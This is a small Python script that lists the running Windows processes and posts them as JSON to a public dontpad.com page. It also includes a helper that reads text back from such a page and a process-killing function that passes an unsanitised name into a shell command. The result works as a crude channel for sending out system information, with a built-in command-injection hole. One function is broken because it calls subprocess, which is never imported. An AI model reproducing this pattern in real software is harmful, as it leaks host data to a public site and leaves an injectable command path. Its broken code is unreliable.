from requests import get, post
from subprocess import check_output
from json import dumps

def acessar_dontpad(link_dontpad):
    dontpad = get(link_dontpad).text
    text =  dontpad[dontpad.find('<textarea id="text">' ) + len('<textarea id="text">') : dontpad.find('</textarea>') ]
    return text

def listar_processos():
    lista_processos = []

    comando = "tasklist"
    comando_output = check_output(comando, shell=True).decode("latin-1")

    comando_output = comando_output.split("\n")
    comando_output = comando_output[3:]

    for processos in comando_output:
        processo = processos.split()
        if len(processo) > 0:
            if ".exe" in processo[0]:
                lista_processos.append({"processo":processo[0], "PID":processo[1]})

    lista_processos = dumps(lista_processos)
    return lista_processos

def encerrar_processos(nome_exe):
    comando = "taskkill /IM " + nome_exe
    subprocess.check_output(comando, shell=True).decode("latin-1")
    return 0

def enviar_processos_dontpad(lista_processos, url):
    data = {"text": lista_processos}
    post(url, data).text
    return 0

def main(args):
    url = "http://dontpad.com/testando2015"
    lista_de_processos = listar_processos()
    enviar_processos_dontpad(lista_de_processos, url)
    return 0

if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
